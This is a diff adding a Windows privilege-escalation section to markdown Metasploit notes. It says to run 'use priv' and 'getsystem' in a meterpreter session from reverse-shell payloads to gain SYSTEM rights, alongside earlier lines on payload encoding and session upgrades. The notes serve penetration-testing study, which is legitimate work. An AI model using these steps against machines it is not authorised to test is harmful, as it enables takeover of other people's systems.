@@ -22,3 +22,17 @@ Then, you can something like `-e x86/shikata_ga_nai` when creating the payload.
 ## Session handling
 
 upgrade recent session to meterpreter session: `sessions -u -1`
+
+## Windows Priv Esc
+
+Using a meterpreter session of from payloads `windows/x64/shell_reverse_tcp` or `windows/shell/reverse_tcp`, you can do this script-kiddie move to privilege escalate:
+
+```
+meterpreter > use priv
+```
+(this might just say `[!] The "priv" extension has already been loaded.`)
+```
+getsystem
+```
+and meterpreter will do it's best to get you `NT AUTHORITY\SYSTEM`
+
